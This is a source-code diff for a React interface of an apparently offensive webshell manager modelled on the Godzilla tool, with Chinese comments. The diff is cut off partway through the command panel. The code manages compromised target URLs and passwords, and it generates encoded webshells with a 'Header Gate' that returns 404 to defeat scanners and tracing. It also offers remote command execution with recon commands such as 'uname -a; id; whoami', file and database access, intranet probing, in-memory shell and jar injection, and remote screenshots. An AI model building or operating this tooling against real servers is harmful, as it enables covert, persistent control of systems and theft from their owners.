@@ -1,38 +1,47 @@
 "use client";
 
-// webshell-console.tsx — Webshell 三栏工作台（对齐 morelian 默连能力面）：
-// 左：目标管理（分组/搜索/批量测活/增删改）；中：会话 Tabs（按载荷动态）：
-// 终端 / 文件管理 / 数据库 / 网络 / 进程 / 内存马(JSP) / Servlet(JSP) / Jar(JSP) /
-// 截图(JSP) / PHP工具(PHP) / 笔记 / 信息；生成对话框支持 Header Gate。
+// webshell-console.tsx — 哥斯拉（Godzilla）风格 Webshell 管理器 UI：
+//   主窗：工具栏（添加/编辑/删除/全部测试/生成）+ 目标表格（复选 | URL | 密码 |
+//         加密器 | 脚本 | 备注 | 状态），双击行打开会话窗
+//   会话窗（深色伪窗口）：标题栏（目标/连接参数/断开）+ 哥斯拉式功能按钮条
+//         （信息 文件 命令 数据库 网络 进程 内存马 Servlet Jar 截图 PHP工具 笔记，
+//         按载荷动态显示）+ 面板区
+//   文件管理器：工具栏（刷新/上传/下载/新建文件/新建文件夹/重命名/删除）+
+//         路径栏 + 表格（名称/修改时间/文件大小）
+//   命令执行：黑底输出区 + 命令行 + cwd，快捷命令按钮
 import React from "react";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { api, type WSTarget } from "@/lib/api";
 import {
-  PlayIcon, RefreshCw, TrashIcon, PencilIcon, PlusIcon, StarIcon,
-  FolderUpIcon, FilePlusIcon, FolderPlusIcon, DownloadIcon, CameraIcon, ZapIcon,
+  PlayIcon, RefreshCw, TrashIcon, PencilIcon, PlusIcon, ZapIcon,
+  FolderUpIcon, FilePlusIcon, FolderPlusIcon, PencilLineIcon,
+  InfoIcon, FolderIcon, TerminalIcon, DatabaseIcon, NetworkIcon,
+  CpuIcon, BugIcon, LayoutGridIcon, PackageIcon, CameraIcon, WrenchIcon,
+  NotebookPenIcon, XIcon,
 } from "lucide-react";
 
 const SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
 const ENCODERS = ["raw", "aes", "xor"];
 
-// ExtOps 前端镜像：插件 Tab 按载荷动态显示（与服务端 ExtOps 一致）。
 function extOps(st: string): string[] {
-  if (st === "php") return ["db", "net", "proc", "zip", "phptool"];
+  if (st === "php") return ["db", "net", "proc", "phptool"];
   if (st === "jsp" || st === "jspx") return ["db", "net", "memshell", "servlet", "jar", "shot"];
   return [];
 }
 
-// ---------- 主组件 ----------
+// ==================== 主窗 ====================
+
 export default function WebshellConsole() {
   const [targets, setTargets] = React.useState<WSTarget[]>([]);
   const [q, setQ] = React.useState("");
-  const [sel, setSel] = React.useState<WSTarget | null>(null);
+  const [checked, setChecked] = React.useState<Set<number>>(new Set());
+  const [session, setSession] = React.useState<WSTarget | null>(null);
   const [genOpen, setGenOpen] = React.useState(false);
-  const [addOpen, setAddOpen] = React.useState(false);
-  const [addForm, setAddForm] = React.useState<Partial<WSTarget>>({ group: "default", encoder: "raw", script_type: "php" });
+  const [edit, setEdit] = React.useState<Partial<WSTarget> | null>(null);
   const [checking, setChecking] = React.useState(false);
+  const [reload, setReload] = React.useState(0);
   const searchDeb = React.useRef<ReturnType<typeof setTimeout> | null>(null);
 
   const load = React.useCallback(async (query?: string) => {
@@ -41,7 +50,7 @@ export default function WebshellConsole() {
       setTargets(r.data || []);
     } catch { /* ignore */ }
   }, []);
-  React.useEffect(() => { load(); }, [load]);
+  React.useEffect(() => { load(); }, [load, reload]);
 
   const onSearch = (v: string) => {
     setQ(v);
@@ -49,148 +58,141 @@ export default function WebshellConsole() {
     searchDeb.current = setTimeout(() => load(v.trim() || undefined), 300);
   };
 
+  const sel = targets.filter((t) => checked.has(t.id));
+  const toggle = (id: number) => {
+    setChecked((s) => {
+      const n = new Set(s);
+      if (n.has(id)) n.delete(id); else n.add(id);
+      return n;
+    });
+  };
+  const toggleAll = () => {
+    setChecked((s) => (s.size === targets.length ? new Set() : new Set(targets.map((t) => t.id))));
+  };
+
+  const delChecked = async () => {
+    if (!sel.length || !window.confirm(`删除选中的 ${sel.length} 个目标？`)) return;
+    for (const t of sel) await api.wsTargetDelete(t.id);
+    setChecked(new Set());
+    setReload((n) => n + 1);
+  };
+
   const checkAll = async () => {
     setChecking(true);
     try {
-      await api.wsTargetsCheck();
-      await load(q.trim() || undefined);
+      await api.wsTargetsCheck(checked.size ? Array.from(checked) : []);
+      setReload((n) => n + 1);
     } finally { setChecking(false); }
   };
 
-  const del = async (t: WSTarget) => {
-    if (!window.confirm(`删除目标「${t.name || t.url}」？`)) return;
-    if (sel?.id === t.id) setSel(null);
-    await api.wsTargetDelete(t.id);
-    load(q.trim() || undefined);
+  const openEdit = (t?: WSTarget) => {
+    setEdit(t ? { ...t } : { group: "default", encoder: "raw", script_type: "php", url: "", password: "", name: "", note: "", headers: "" });
   };
 
-  const save = async () => {
-    if (!addForm.url?.trim()) return void window.alert("URL 必填");
-    try {
-      await api.wsTargetSave(addForm);
-      setAddOpen(false);
-      load(q.trim() || undefined);
-    } catch (e) {
-      window.alert("保存失败: " + (e instanceof Error ? e.message : String(e)));
-    }
+  const saveEdit = async () => {
+    if (!edit?.url?.trim()) return void window.alert("URL 必填");
+    await api.wsTargetSave(edit);
+    setEdit(null);
+    setReload((n) => n + 1);
   };
-
-  // 分组
-  const groups = React.useMemo(() => {
-    const m = new Map<string, WSTarget[]>();
-    for (const t of targets) {
-      const g = t.group || "default";
-      if (!m.has(g)) m.set(g, []);
-      m.get(g)!.push(t);
-    }
-    return Array.from(m.entries());
-  }, [targets]);
 
   return (
-    <div className="flex gap-3">
-      {/* 左：目标列表 */}
-      <div className="w-64 shrink-0 space-y-2">
-        <Card>
-          <CardContent className="space-y-2 p-2">
-            <div className="flex gap-1">
-              <Input className="h-7 text-xs" placeholder="搜索名称/URL…" value={q} onChange={(e) => onSearch(e.target.value)} />
-            </div>
-            <div className="flex gap-1">
-              <Button variant="outline" size="sm" className="h-7 flex-1 text-xs" onClick={() => { setAddForm({ group: "default", encoder: "raw", script_type: "php", id: 0, name: "", url: "", password: "", note: "", headers: "" }); setAddOpen(true); }}>
-                <PlusIcon className="mr-1 size-3.5" /> 添加目标
-              </Button>
-              <Button variant="outline" size="sm" className="h-7 flex-1 text-xs" onClick={checkAll} disabled={checking}>
-                <RefreshCw className={`mr-1 size-3.5 ${checking ? "animate-spin" : ""}`} /> 测活
-              </Button>
-            </div>
-            <div className="max-h-[560px] space-y-2 overflow-auto">
-              {groups.length === 0 && <div className="py-6 text-center text-xs text-muted-foreground">暂无目标</div>}
-              {groups.map(([g, items]) => (
-                <div key={g}>
-                  <div className="px-1 py-0.5 text-[10px] font-semibold uppercase text-muted-foreground">{g}（{items.length}）</div>
-                  {items.map((t) => (
-                    <div
-                      key={t.id}
-                      className={`group cursor-pointer rounded border p-1.5 text-xs hover:bg-muted/60 ${sel?.id === t.id ? "border-primary bg-muted" : ""}`}
-                      onClick={() => setSel(t)}
-                    >
-                      <div className="flex items-center justify-between gap-1">
-                        <span className="truncate font-medium">{t.name || t.url}</span>
-                        <span className={`shrink-0 rounded px-1 text-[10px] ${t.alive ? "bg-green-500/15 text-green-600" : "bg-muted text-muted-foreground"}`}>
-                          {t.alive ? "活" : "未测"}
-                        </span>
-                      </div>
-                      <div className="truncate text-[10px] text-muted-foreground">{t.url}</div>
-                      <div className="flex items-center justify-between">
-                        <span className="text-[10px] text-muted-foreground">{t.script_type}/{t.encoder}</span>
-                        <span className="hidden gap-1 group-hover:flex">
-                          <button title="编辑" onClick={(e) => { e.stopPropagation(); setAddForm({ ...t }); setAddOpen(true); }}>
-                            <PencilIcon className="size-3" />
-                          </button>
-                          <button title="删除" onClick={(e) => { e.stopPropagation(); del(t); }}>
-                            <TrashIcon className="size-3 text-red-400" />
-                          </button>
-                        </span>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              ))}
-            </div>
-          </CardContent>
-        </Card>
-        <Button variant="outline" size="sm" className="w-full text-xs" onClick={() => setGenOpen(!genOpen)}>
-          <ZapIcon className="mr-1 size-3.5" /> 生成 Webshell
+    <div className="space-y-2">
+      {/* 工具栏（哥斯拉主窗顶部） */}
+      <div className="flex flex-wrap items-center gap-2 rounded border bg-muted/30 p-2">
+        <Button size="sm" variant="secondary" onClick={() => openEdit()}><PlusIcon className="mr-1 size-4" /> 添加</Button>
+        <Button size="sm" variant="outline" disabled={!sel.length} onClick={() => openEdit(sel[0])}><PencilIcon className="mr-1 size-4" /> 编辑</Button>
+        <Button size="sm" variant="outline" disabled={!sel.length} onClick={delChecked}><TrashIcon className="mr-1 size-4" /> 删除</Button>
+        <Button size="sm" variant="outline" onClick={checkAll} disabled={checking}>
+          <RefreshCw className={`mr-1 size-4 ${checking ? "animate-spin" : ""}`} /> {checked.size ? `测试选中(${checked.size})` : "全部测试"}
         </Button>
+        <Button size="sm" variant="outline" onClick={() => setGenOpen(!genOpen)}><ZapIcon className="mr-1 size-4" /> 生成</Button>
+        <Input className="ml-auto h-8 w-52 text-xs" placeholder="搜索 URL/名称/备注…" value={q} onChange={(e) => onSearch(e.target.value)} />
       </div>
 
-      {/* 中：会话工作台 */}
-      <div className="min-w-0 flex-1">
-        {genOpen ? <GeneratePanel onClose={() => setGenOpen(false)} /> : sel ? <SessionTabs target={sel} onEdit={() => { setAddForm({ ...sel }); setAddOpen(true); }} /> : (
-          <Card>
-            <CardContent className="py-16 text-center text-sm text-muted-foreground">
-              左侧选择目标打开会话，或添加/生成新 Webshell
-            </CardContent>
-          </Card>
-        )}
+      {/* 目标表格（哥斯拉式：复选|URL|密码|加密器|脚本|备注|状态；双击开窗） */}
+      <div className="overflow-hidden rounded border">
+        <table className="w-full text-xs">
+          <thead className="bg-muted">
+            <tr className="text-left text-muted-foreground">
+              <th className="w-8 px-2 py-1.5"><input type="checkbox" checked={targets.length > 0 && checked.size === targets.length} onChange={toggleAll} /></th>
+              <th>URL 地址</th>
+              <th className="w-28">密码</th>
+              <th className="w-20">加密器</th>
+              <th className="w-16">脚本</th>
+              <th className="w-24">分组</th>
+              <th>备注</th>
+              <th className="w-16">状态</th>
+            </tr>
+          </thead>
+          <tbody>
+            {targets.length === 0 && (
+              <tr><td colSpan={8} className="py-8 text-center text-muted-foreground">暂无目标——「添加」录入或「生成」后部署</td></tr>
+            )}
+            {targets.map((t) => (
+              <tr
+                key={t.id}
+                className={`cursor-pointer border-b border-border/40 hover:bg-muted/40 ${checked.has(t.id) ? "bg-primary/5" : ""}`}
+                onClick={() => toggle(t.id)}
+                onDoubleClick={() => setSession(t)}
+              >
+                <td className="px-2 py-1"><input type="checkbox" checked={checked.has(t.id)} onClick={(e) => e.stopPropagation()} onChange={() => toggle(t.id)} /></td>
+                <td className="py-1 font-mono text-blue-500" title={t.url}>{t.url}</td>
+                <td className="font-mono text-muted-foreground">{t.password ? "••••" : "-"}</td>
+                <td>{t.encoder}</td>
+                <td>{t.script_type}</td>
+                <td className="text-muted-foreground">{t.group}</td>
+                <td className="truncate text-muted-foreground" title={t.note}>{t.note || (t.name && t.name)}</td>
+                <td>
+                  <span className={`rounded px-1.5 py-0.5 text-[10px] ${t.alive ? "bg-green-500/15 text-green-600" : t.last_check ? "bg-red-500/15 text-red-500" : "bg-muted text-muted-foreground"}`}>
+                    {t.alive ? "连接" : t.last_check ? "断开" : "未测"}
+                  </span>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
       </div>
+      <div className="text-[10px] text-muted-foreground">双击行打开会话窗口；单机勾选后可编辑/删除/批量测活。</div>
 
-      {/* 添加/编辑对话框 */}
-      {addOpen && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setAddOpen(false)}>
+      {/* 编辑/添加对话框 */}
+      {edit && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setEdit(null)}>
           <Card className="w-[460px]" onClick={(e) => e.stopPropagation()}>
-            <CardHeader className="py-2"><CardTitle className="text-sm">{addForm.id ? "编辑目标" : "添加目标"}</CardTitle></CardHeader>
             <CardContent className="space-y-2 p-3 text-sm">
-              <div className="grid grid-cols-2 gap-2">
-                <Input placeholder="分组（default）" value={addForm.group || ""} onChange={(e) => setAddForm({ ...addForm, group: e.target.value })} />
-                <Input placeholder="名称" value={addForm.name || ""} onChange={(e) => setAddForm({ ...addForm, name: e.target.value })} />
-              </div>
-              <Input placeholder="URL（http://target/shell.php）" value={addForm.url || ""} onChange={(e) => setAddForm({ ...addForm, url: e.target.value })} />
-              <div className="grid grid-cols-3 gap-2">
-                <Input placeholder="密码" value={addForm.password || ""} onChange={(e) => setAddForm({ ...addForm, password: e.target.value })} />
-                <select className="rounded border bg-transparent p-1.5 text-sm" value={addForm.encoder || "raw"} onChange={(e) => setAddForm({ ...addForm, encoder: e.target.value })}>
+              <div className="text-sm font-semibold">{edit.id ? "编辑目标" : "添加目标"}</div>
+              <Input placeholder="名称（备注列显示）" value={edit.name || ""} onChange={(e) => setEdit({ ...edit, name: e.target.value })} />
+              <Input placeholder="URL（http://target/shell.php）" value={edit.url || ""} onChange={(e) => setEdit({ ...edit, url: e.target.value })} />
+              <div className="grid grid-cols-4 gap-2">
+                <Input placeholder="密码" value={edit.password || ""} onChange={(e) => setEdit({ ...edit, password: e.target.value })} />
+                <select className="rounded border bg-transparent p-1.5 text-sm" value={edit.encoder || "raw"} onChange={(e) => setEdit({ ...edit, encoder: e.target.value })}>
                   {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
                 </select>
-                <select className="rounded border bg-transparent p-1.5 text-sm" value={addForm.script_type || "php"} onChange={(e) => setAddForm({ ...addForm, script_type: e.target.value })}>
+                <select className="rounded border bg-transparent p-1.5 text-sm" value={edit.script_type || "php"} onChange={(e) => setEdit({ ...edit, script_type: e.target.value })}>
                   {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
                 </select>
+                <Input placeholder="分组" value={edit.group || ""} onChange={(e) => setEdit({ ...edit, group: e.target.value })} />
               </div>
-              <Input placeholder='附加头 JSON（如 {"X-Gate":"v","User-Agent":"Mozilla/5.0 …"}）' value={addForm.headers || ""} onChange={(e) => setAddForm({ ...addForm, headers: e.target.value })} />
-              <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={addForm.note || ""} onChange={(e) => setAddForm({ ...addForm, note: e.target.value })} />
+              <Input placeholder='附加头 JSON（Gate/UA，如 {"X-Gate":"v"}）' value={edit.headers || ""} onChange={(e) => setEdit({ ...edit, headers: e.target.value })} />
+              <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={edit.note || ""} onChange={(e) => setEdit({ ...edit, note: e.target.value })} />
               <div className="flex justify-end gap-2">
-                <Button variant="outline" size="sm" onClick={() => setAddOpen(false)}>取消</Button>
-                <Button size="sm" onClick={save}>保存</Button>
+                <Button variant="outline" size="sm" onClick={() => setEdit(null)}>取消</Button>
+                <Button size="sm" onClick={saveEdit}>保存</Button>
               </div>
             </CardContent>
           </Card>
         </div>
       )}
+
+      {genOpen && <GenerateDialog onClose={() => setGenOpen(false)} />}
+      {session && <SessionWindow target={session} onClose={() => { setSession(null); setReload((n) => n + 1); }} />}
     </div>
   );
 }
 
-// ---------- 生成面板 ----------
-function GeneratePanel({ onClose }: { onClose: () => void }) {
+// ==================== 生成对话框 ====================
+
+function GenerateDialog({ onClose }: { onClose: () => void }) {
   const [st, setSt] = React.useState("php");
   const [enc, setEnc] = React.useState("raw");
   const [pwd, setPwd] = React.useState("");
@@ -212,104 +214,133 @@ function GeneratePanel({ onClose }: { onClose: () => void }) {
   };
 
   return (
-    <Card>
-      <CardHeader className="flex flex-row items-center justify-between py-2">
-        <CardTitle className="text-sm">生成 Webshell</CardTitle>
-        <Button variant="outline" size="sm" onClick={onClose}>收起</Button>
-      </CardHeader>
-      <CardContent className="space-y-2 p-3 text-sm">
-        <div className="grid grid-cols-3 gap-2">
-          <select className="rounded border bg-transparent p-1.5" value={st} onChange={(e) => setSt(e.target.value)}>
-            {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
-          </select>
-          <select className="rounded border bg-transparent p-1.5" value={enc} onChange={(e) => setEnc(e.target.value)}>
-            {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
-          </select>
-          <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
-        </div>
-        <div className="grid grid-cols-2 gap-2">
-          <Input placeholder="Header Gate 头名（可选，如 X-Gate）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
-          <Input placeholder="Gate 值（无此头返回 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
-        </div>
-        <div className="text-xs text-muted-foreground">
-          Header Gate：服务端只在校验头匹配时才执行，缺失时返回 404——对抗扫描器与溯源探测（连接目标时把同名头写进「附加头 JSON」即可）。
-          php/jsp/jspx/asp/aspx 支持；py/node 由外层框架管 header，忽略。
-        </div>
-        <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? "生成中…" : "生成"}</Button>
-        {gen && (
-          <div className="space-y-1">
-            <div className="flex items-center justify-between text-xs text-muted-foreground">
-              <span>已存 {gen.path}（{gen.size} 字节）</span>
-              <Button variant="outline" size="sm" onClick={async () => { await navigator.clipboard.writeText(gen.code); setCopied(true); setTimeout(() => setCopied(false), 1500); }}>
-                {copied ? "已复制 ✓" : "复制代码"}
-              </Button>
-            </div>
-            <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px]">{gen.code}</pre>
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={onClose}>
+      <Card className="w-[560px]" onClick={(e) => e.stopPropagation()}>
+        <CardContent className="space-y-2 p-3 text-sm">
+          <div className="flex items-center justify-between">
+            <div className="text-sm font-semibold">生成 Webshell（Godzilla 生成器）</div>
+            <button onClick={onClose}><XIcon className="size-4" /></button>
           </div>
-        )}
-      </CardContent>
-    </Card>
+          <div className="grid grid-cols-3 gap-2">
+            <select className="rounded border bg-transparent p-1.5" value={st} onChange={(e) => setSt(e.target.value)}>
+              {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
+            </select>
+            <select className="rounded border bg-transparent p-1.5" value={enc} onChange={(e) => setEnc(e.target.value)}>
+              {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
+            </select>
+            <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
+          </div>
+          <div className="grid grid-cols-2 gap-2">
+            <Input placeholder="Header Gate 头名（可选）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
+            <Input placeholder="Gate 值（缺头 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
+          </div>
+          <div className="text-[11px] text-muted-foreground">
+            Header Gate：缺校验头直接 404，对抗扫描器。连接目标时把同名头写进「附加头 JSON」。
+          </div>
+          <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? "生成中…" : "生成"}</Button>
+          {gen && (
+            <div className="space-y-1">
+              <div className="flex items-center justify-between text-xs text-muted-foreground">
+                <span>已存 {gen.path}（{gen.size} 字节）</span>
+                <Button variant="outline" size="sm" onClick={async () => { await navigator.clipboard.writeText(gen.code); setCopied(true); setTimeout(() => setCopied(false), 1500); }}>
+                  {copied ? "已复制 ✓" : "复制代码"}
+                </Button>
+              </div>
+              <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-zinc-900 p-2 font-mono text-[11px] text-zinc-200">{gen.code}</pre>
+            </div>
+          )}
+        </CardContent>
+      </Card>
+    </div>
   );
 }
 
-// ---------- 会话 Tabs ----------
-type SessionTab = "info" | "terminal" | "files" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";
+// ==================== 会话窗口（哥斯拉式：深色伪窗口 + 功能按钮条） ====================
 
-function SessionTabs({ target, onEdit }: { target: WSTarget; onEdit: () => void }) {
+type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";
+
+function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => void }) {
   const ops = extOps(target.script_type);
-  const tabs: { key: SessionTab; label: string }[] = [
-    { key: "info", label: "信息" },
-    { key: "terminal", label: "终端" },
-    { key: "files", label: "文件" },
-    ...(ops.includes("db") ? [{ key: "db" as SessionTab, label: "数据库" }] : []),
-    ...(ops.includes("net") ? [{ key: "net" as SessionTab, label: "网络" }] : []),
-    ...(ops.includes("proc") ? [{ key: "proc" as SessionTab, label: "进程" }] : []),
-    ...(ops.includes("memshell") ? [{ key: "memshell" as SessionTab, label: "内存马" }] : []),
-    ...(ops.includes("servlet") ? [{ key: "servlet" as SessionTab, label: "Servlet" }] : []),
-    ...(ops.includes("jar") ? [{ key: "jar" as SessionTab, label: "Jar" }] : []),
-    ...(ops.includes("shot") ? [{ key: "shot" as SessionTab, label: "截图" }] : []),
-    ...(ops.includes("phptool") ? [{ key: "phptool" as SessionTab, label: "PHP工具" }] : []),
-    { key: "note", label: "笔记" },
+  const panels: { key: PanelKey; label: string; icon: React.ReactNode }[] = [
+    { key: "info", label: "基础信息", icon: <InfoIcon className="size-4" /> },
+    { key: "files", label: "文件管理", icon: <FolderIcon className="size-4" /> },
+    { key: "cmd", label: "命令执行", icon: <TerminalIcon className="size-4" /> },
+    ...(ops.includes("db") ? [{ key: "db" as PanelKey, label: "数据库", icon: <DatabaseIcon className="size-4" /> }] : []),
+    ...(ops.includes("net") ? [{ key: "net" as PanelKey, label: "内网探测", icon: <NetworkIcon className="size-4" /> }] : []),
+    ...(ops.includes("proc") ? [{ key: "proc" as PanelKey, label: "进程管理", icon: <CpuIcon className="size-4" /> }] : []),
+    ...(ops.includes("memshell") ? [{ key: "memshell" as PanelKey, label: "内存马", icon: <BugIcon className="size-4" /> }] : []),
+    ...(ops.includes("servlet") ? [{ key: "servlet" as PanelKey, label: "Servlet", icon: <LayoutGridIcon className="size-4" /> }] : []),
+    ...(ops.includes("jar") ? [{ key: "jar" as PanelKey, label: "Jar加载", icon: <PackageIcon className="size-4" /> }] : []),
+    ...(ops.includes("shot") ? [{ key: "shot" as PanelKey, label: "远程屏幕", icon: <CameraIcon className="size-4" /> }] : []),
+    ...(ops.includes("phptool") ? [{ key: "phptool" as PanelKey, label: "PHP工具", icon: <WrenchIcon className="size-4" /> }] : []),
+    { key: "note", label: "笔记", icon: <NotebookPenIcon className="size-4" /> },
   ];
-  const [tab, setTab] = React.useState<SessionTab>("terminal");
+  const [panel, setPanel] = React.useState<PanelKey>("cmd");
+
   return (
-    <Card>
-      <CardContent className="p-2">
-        <div className="mb-2 flex flex-wrap items-center gap-1 border-b pb-1.5">
-          {tabs.map((t) => (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4">
+      <div className="flex h-full w-full max-w-[1280px] flex-col overflow-hidden rounded-lg border border-zinc-700 bg-zinc-900 text-zinc-200 shadow-2xl">
+        {/* 标题栏 */}
+        <div className="flex items-center gap-2 border-b border-zinc-700 bg-zinc-800 px-3 py-2 text-sm">
+          <span className="flex gap-1.5">
+            <span className="size-3 rounded-full bg-red-500" /><span className="size-3 rounded-full bg-yellow-500" /><span className="size-3 rounded-full bg-green-500" />
+          </span>
+          <span className="ml-2 font-semibold text-zinc-100">{target.name || target.url}</span>
+          <span className="font-mono text-[11px] text-zinc-400">{target.script_type} · {target.encoder} · {target.url}</span>
+          <span className={`ml-2 rounded px-1.5 text-[10px] ${target.alive ? "bg-green-500/20 text-green-400" : "bg-zinc-700 text-zinc-400"}`}>
+            {target.alive ? "已连接" : "未验证"}
+          </span>
+          <button className="ml-auto text-zinc-400 hover:text-red-400" onClick={onClose} title="断开会话"><XIcon className="size-4" /></button>
+        </div>
+        {/* 功能按钮条（哥斯拉会话顶栏） */}
+        <div className="flex flex-wrap gap-1 border-b border-zinc-700 bg-zinc-800/60 px-2 py-1.5">
+          {panels.map((p) => (
             <button
-              key={t.key}
-              className={`rounded px-2 py-1 text-xs ${tab === t.key ? "bg-muted font-semibold" : "text-muted-foreground hover:bg-muted/50"}`}
-              onClick={() => setTab(t.key)}
+              key={p.key}
+              className={`flex items-center gap-1 rounded px-2.5 py-1.5 text-xs ${panel === p.key ? "bg-blue-600 font-semibold text-white" : "text-zinc-300 hover:bg-zinc-700"}`}
+              onClick={() => setPanel(p.key)}
             >
-              {t.label}
+              {p.icon}{p.label}
             </button>
           ))}
-          <span className="ml-auto text-xs text-muted-foreground">{target.name || target.url} · {target.script_type}/{target.encoder}</span>
-          <Button variant="outline" size="sm" className="h-6 text-xs" onClick={onEdit}>编辑</Button>
         </div>
-        {tab === "info" && <InfoPanel target={target} />}
-        {tab === "terminal" && <TerminalPanel target={target} />}
-        {tab === "files" && <FilesPanel target={target} />}
-        {tab === "db" && <DBPanel target={target} />}
-        {tab === "net" && <NetPanel target={target} />}
-        {tab === "proc" && <ProcPanel target={target} />}
-        {tab === "memshell" && <MemshellPanel target={target} />}
-        {tab === "servlet" && <ServletPanel target={target} />}
-        {tab === "jar" && <JarPanel target={target} />}
-        {tab === "shot" && <ShotPanel target={target} />}
-        {tab === "phptool" && <PHPToolPanel target={target} />}
-        {tab === "note" && <NotePanel target={target} />}
-      </CardContent>
-    </Card>
+        {/* 面板区 */}
+        <div className="min-h-0 flex-1 overflow-auto bg-zinc-900 p-3">
+          {panel === "info" && <InfoPanel target={target} />}
+          {panel === "files" && <FilesPanel target={target} />}
+          {panel === "cmd" && <CmdPanel target={target} />}
+          {panel === "db" && <DBPanel target={target} />}
+          {panel === "net" && <NetPanel target={target} />}
+          {panel === "proc" && <ProcPanel target={target} />}
+          {panel === "memshell" && <MemshellPanel target={target} />}
+          {panel === "servlet" && <ServletPanel target={target} />}
+          {panel === "jar" && <JarPanel target={target} />}
+          {panel === "shot" && <ShotPanel target={target} />}
+          {panel === "phptool" && <PHPToolPanel target={target} />}
+          {panel === "note" && <NotePanel target={target} />}
+        </div>
+      </div>
+    </div>
   );
 }
 
-// ---------- 各面板共用的执行钩子 ----------
+// ---------- 深色面板共通小件 ----------
+
+const DInput = (props: React.InputHTMLAttributes<HTMLInputElement>) => (
+  <input {...props} className={`rounded border border-zinc-700 bg-zinc-800 px-2 py-1 font-mono text-xs text-zinc-200 placeholder:text-zinc-500 outline-none focus:border-blue-500 ${props.className || ""}`} />
+);
+const DBtn = ({ children, ...props }: React.ButtonHTMLAttributes<HTMLButtonElement>) => (
+  <button {...props} className={`flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2 py-1 text-[11px] text-zinc-200 hover:bg-zinc-700 disabled:opacity-40 ${props.className || ""}`}>{children}</button>
+);
+const DPre = ({ children }: { children: React.ReactNode }) => (
+  <pre className="overflow-auto whitespace-pre-wrap rounded border border-zinc-700 bg-black/60 p-2 font-mono text-[11px] leading-relaxed text-zinc-300">{children}</pre>
+);
+
+// ---------- 执行钩子 ----------
+
 function useRunner(target: WSTarget) {
   const [busy, setBusy] = React.useState(false);
-  const headers = target.headers || "";
-  const base = { url: target.url, password: target.password, encoder: target.encoder, script_type: target.script_type, headers };
+  const base = { url: target.url, password: target.password, encoder: target.encoder, script_type: target.script_type, headers: target.headers || "" };
   const exec = async (op: string, extra: Record<string, unknown>) => {
     setBusy(true);
     try {
@@ -331,33 +362,35 @@ function useRunner(target: WSTarget) {
   return { busy, exec, ext };
 }
 
+// ---------- 基础信息 ----------
+
 function InfoPanel({ target }: { target: WSTarget }) {
   const [info, setInfo] = React.useState("");
-  const { busy, exec, ext } = useRunner(target);
+  const { busy, exec } = useRunner(target);
   const probe = async () => {
     const phpCmd = 'echo "PHP_OS=".PHP_OS."; PHPVER=".PHP_VERSION;';
-    const r = await exec("exec", {
-      cmd: target.script_type === "php" ? phpCmd : "uname -a; id",
-    });
+    const r = await exec("exec", { cmd: target.script_type === "php" ? phpCmd : "uname -a; id; whoami" });
     setInfo(r.ok ? r.output : "[失败] " + r.error);
   };
   return (
     <div className="space-y-2 text-sm">
-      <div className="grid grid-cols-2 gap-1 text-xs">
+      <div className="grid grid-cols-2 gap-1 text-xs md:grid-cols-3">
         {[["URL", target.url], ["载荷", `${target.script_type}/${target.encoder}`], ["存活", target.alive ? "是" : "未测/否"], ["最近检测", target.last_check || "-"], ["分组", target.group], ["附加头", target.headers || "-"]].map(([k, v]) => (
-          <div key={k} className="rounded border p-1.5">
-            <span className="text-muted-foreground">{k}：</span>
-            <span className="font-mono break-all">{v}</span>
+          <div key={k} className="rounded border border-zinc-700 bg-zinc-800/60 p-1.5">
+            <span className="text-zinc-500">{k}：</span>
+            <span className="break-all font-mono text-zinc-200">{v}</span>
           </div>
         ))}
       </div>
-      <Button size="sm" onClick={probe} disabled={busy}><PlayIcon className="mr-1 size-4" /> 采集基础信息</Button>
-      {info && <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{info}</pre>}
+      <DBtn onClick={probe} disabled={busy}><PlayIcon className="size-3.5" /> 采集目标基础信息</DBtn>
+      {info && <DPre>{info}</DPre>}
     </div>
   );
 }
 
-function TerminalPanel({ target }: { target: WSTarget }) {
+// ---------- 命令执行（哥斯拉：输出区+命令行） ----------
+
+function CmdPanel({ target }: { target: WSTarget }) {
   const [out, setOut] = React.useState("");
   const [cmd, setCmd] = React.useState("");
   const [cwd, setCwd] = React.useState("");
@@ -378,25 +411,22 @@ function TerminalPanel({ target }: { target: WSTarget }) {
   };
 
   const quick = target.script_type === "php"
